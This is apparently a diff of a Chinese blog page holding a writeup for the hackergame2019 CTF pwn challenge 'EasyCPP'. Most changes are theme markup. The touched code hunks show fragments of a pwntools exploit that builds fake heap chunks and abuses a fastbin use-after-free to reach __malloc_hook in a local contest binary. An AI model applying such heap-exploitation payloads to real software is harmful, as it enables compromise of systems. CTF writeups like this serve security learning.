@@ -5,13 +5,14 @@
   
   <title>hackergame2019 没有bug的教务系统 Writeup - 广莫之野</title>
   <meta charset="UTF-8">
+  <meta name="description" content>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
   
 
   <link rel="shortcut icon" href="/home.png" type="image/png">
   <meta name="description" content="中科大hackergame2019里 没有bug的教务系统 的writeup">
-<meta name="keywords" content="pwn,ctf">
+<meta name="keywords" content="ctf,pwn">
 <meta property="og:type" content="article">
 <meta property="og:title" content="hackergame2019 没有bug的教务系统 Writeup">
 <meta property="og:url" content="http://shiroinu.top/2019/11/02/hackergame2019-easyCPP-wp/index.html">
@@ -22,7 +23,7 @@
 <meta property="og:image" content="https://i.loli.net/2019/11/02/BXERUAtxlVcLGH7.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/02/2pTde9CLxwOEmAy.jpg">
 <meta property="og:image" content="https://i.loli.net/2019/11/02/3REaMuLSAfpOz57.jpg">
-<meta property="og:updated_time" content="2019-11-02T14:53:52.437Z">
+<meta property="og:updated_time" content="2019-12-05T14:00:34.270Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="hackergame2019 没有bug的教务系统 Writeup">
 <meta name="twitter:description" content="中科大hackergame2019里 没有bug的教务系统 的writeup">
@@ -32,42 +33,53 @@
    
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
   
+  
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1574048167635">
+  <link rel="stylesheet" href="/css/style.css?v=1575554516812">
 </head>
 
 <body class="mdui-drawer-body-left">
   
-  <div class="nexmoe-bg" style="background-image: url(/images/back1.png)"></div>
+  <div id="nexmoe-background">
+    <div class="nexmoe-bg" style="background-image: url(/images/back1.png)"></div>
+    <div class="mdui-appbar mdui-shadow-0">
+      <div class="mdui-toolbar">
+        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
+        <div class="mdui-toolbar-spacer"></div>
+        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+        <a href="/" title="tsts" class="mdui-btn mdui-btn-icon"><img src="/images/head_2.png"></a>
+       </div>
+    </div>
+  </div>
   <div id="nexmoe-header">
       <div class="nexmoe-drawer mdui-drawer" id="drawer">
     <div class="nexmoe-avatar mdui-ripple">
-        <a href="/">
-            <img src="/images/head_2.png">
+        <a href="/" title="tsts">
+            <img src="/images/head_2.png" alt="tsts">
         </a>
     </div>
     <div class="nexmoe-count">
-        <div><span>文章</span>12</div>
+        <div><span>文章</span>13</div>
         <div><span>标签</span>2</div>
         <div><span>分类</span>0</div>
     </div>
     <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
         
-        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/">
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
             <i class="mdui-list-item-icon nexmoefont icon-home"></i>
             <div class="mdui-list-item-content">
                 回到首页
             </div>
         </a>
         
-        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html">
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
             <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
             <div class="mdui-list-item-content">
                 关于博客
             </div>
         </a>
         
-        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html">
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
             <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
             <div class="mdui-list-item-content">
                 我的朋友
@@ -80,11 +92,9 @@
   <div class="nexmoe-widget-wrap">
     <h3 class="nexmoe-widget-title">社交按钮</h3>
     <div class="nexmoe-widget nexmoe-social">
-        
         <a class="mdui-ripple" href="https://github.com/killthatshaman/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
             <i class="nexmoefont icon-github"></i>
         </a>
-        
     </div>
 </div>
   
@@ -94,9 +104,10 @@
   
   <div class="nexmoe-widget-wrap">
     <h3 class="nexmoe-widget-title">标签云</h3>
-    <div class="nexmoe-widget tagcloud">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud">
       <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a>
     </div>
+    
   </div>
 
   
@@ -104,7 +115,7 @@
   <div class="nexmoe-widget-wrap">
     <h3 class="nexmoe-widget-title">文章归档</h3>
     <div class="nexmoe-widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li></ul>
     </div>
   </div>
 
@@ -117,47 +128,9 @@
         & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
     </div>
 </div><!-- .nexmoe-drawer -->
-
-<script>
-    const getRealPath = (pathname, desc = false) => {
-        if (!pathname) {
-            pathname = window.location.pathname
-        }
-        let names = pathname.split("/")
-        if (desc === false) {
-            for (let i = names.length - 1; i >= 0; --i) {
-                let name = names[i].trim()
-                if (name.length > 0 && name !== "/" && name !== "index.html") {
-                    return name
-                }
-            }
-        } else {
-            for (let i = 0; i < names.length; ++i) {
-                let name = names[i].trim()
-                if (name.length > 0 && name !== "/" && name !== "index.html") {
-                    return name
-                }
-            }
-        }
-        return "/"
-    }
-    let links = document.querySelectorAll('.nexmoe-list-item');
-    let rootRealPath = getRealPath(window.location.pathname, true);
-    for (let link of links) {
-        let linkPath = link.getAttribute("href");
-        if (linkPath && getRealPath(linkPath, true) === rootRealPath) {
-            link.className = "active nexmoe-list-item mdui-list-item mdui-ripple";
-        }
-    }
-</script>
   </div>
   <div id="nexmoe-content">
     <div class="nexmoe-primary">
-        <div class="nexmoe-tab">
-            <a mdui-drawer="{target: '#drawer', swipe: true}">
-              <i class="mdui-icon material-icons">menu</i>
-            </a>
-          </div>
         <div class="nexmoe-post">
     <div class="nexmoe-post-cover"> 
         
@@ -217,8 +190,8 @@ sh = process(&#39;./EasyCPP&#39;)
 sh.recvuntil(&#39;Username:&#39;)
 sh.sendline(&#39;admin&#39;)
 sh.recvuntil(&#39;Password:&#39;)
-sh.send(ans)</code></pre>
-<pre><code class="python">payload = (p64(0) + p64(0x21) + p64(0)*2 +p64(0) + p64(0x21) + p64(0) *2 + p64(0) + p64(0x21) + p64(0) *2).ljust(0x80,&#39;\x00&#39;)
+sh.send(ans)
+payload = (p64(0) + p64(0x21) + p64(0)*2 +p64(0) + p64(0x21) + p64(0) *2 + p64(0) + p64(0x21) + p64(0) *2).ljust(0x80,&#39;\x00&#39;)
 payload += p64(0)
 edit(payload,&#39;a&#39; * 0x20)
 # 第一次循环是为了将v4 free 置入fastbin中,因此fake chunk其实不必构造
@@ -247,8 +220,8 @@ malloc_hook_offset = 0x3C4B10
 payload = p64(0) + p64(0x71) + p64(libc_base + malloc_hook_offset - find_fake_fast_offset) +p64(0) * 11 + p64(0) + p64(0x21) + p64(pswd_addr + 0x10) + p64(0)*2 #+ &#39;\x21&#39;
 edit(payload,&#39;a&#39; * 0x30)
 # 第四次循环, 构造fake_chunk size = 0x71 用于寻找find_fake_fast
-# 这次循环 仅为了将bss段上的pswd地址free进fastbin链中 fd会被置0</code></pre>
-<pre><code class="python">payload = p64(0) + p64(0x71) + p64(libc_base + malloc_hook_offset - find_fake_fast_offset) +p64(0) * 11 + p64(0) + p64(0x21) + p64(0) + p64(0)*2 #+ &#39;\x21&#39;
+# 这次循环 仅为了将bss段上的pswd地址free进fastbin链中 fd会被置0
+payload = p64(0) + p64(0x71) + p64(libc_base + malloc_hook_offset - find_fake_fast_offset) +p64(0) * 11 + p64(0) + p64(0x21) + p64(0) + p64(0)*2 #+ &#39;\x21&#39;
 edit(payload,&#39;\x00&#39; * 0x60)
 # 第五次循环 UAF 修改刚刚被free的fake chunk 的fd = fake_fast 然后将其malloc 此时已不必利用free(v5) 因此是p64(0)
 payload = p64(0) + p64(0x71) + p64(libc_base + malloc_hook_offset - find_fake_fast_offset) +p64(0) * 11 + p64(0) + p64(0x21) + p64(0) + p64(0)*2 #+ &#39;\x21&#39;
@@ -259,6 +232,10 @@ sh.sendline(&#39;1234&#39;)
 sh.interactive()</code></pre>
 
   </article>
+  
+    
+
+  
   <section class="nexmoe-comment">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
 <div id="gitalk"></div>
@@ -291,8 +268,11 @@ sh.interactive()</code></pre>
 <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
 
-<script src="/js/app.js?v=1574048167539"></script>
+<script src="/js/app.js?v=1575554516817"></script>
 <script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+
+
 
   
 
